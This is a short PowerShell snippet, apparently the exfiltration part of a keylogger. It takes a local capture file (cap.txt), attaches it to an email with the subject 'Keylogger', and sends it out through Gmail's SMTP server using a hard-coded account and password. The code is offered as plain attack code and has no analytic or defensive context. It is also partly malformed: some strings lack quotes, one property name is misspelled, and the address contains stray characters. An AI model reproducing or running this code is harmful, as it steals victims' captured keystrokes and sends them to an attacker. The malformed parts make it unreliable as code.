$Username = eviMai@gmai.com�;$Password = SUP3R_S3CUR3_P4SS!;$path = .\cap.txt;$message = new-object Net.Mail.MailMessage;$message.Form = eviMai@gmai.com�;$message.To.Add($Username);$message.Subject = 'Keylogger';$message.Body = 'Keylogger';$attachment = New-Object Net.Mail.Attachment($path);$message.Attachments.Add($attachment);$smtp = new-object Net.Mail.SmtpClient(smtp://smtp.gmail.com, "587");$smtp.EnableSSL = $true;$smtp.UseDefaultCredentials = $false;$smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);$smtp.send($message);$attachment.Dispose();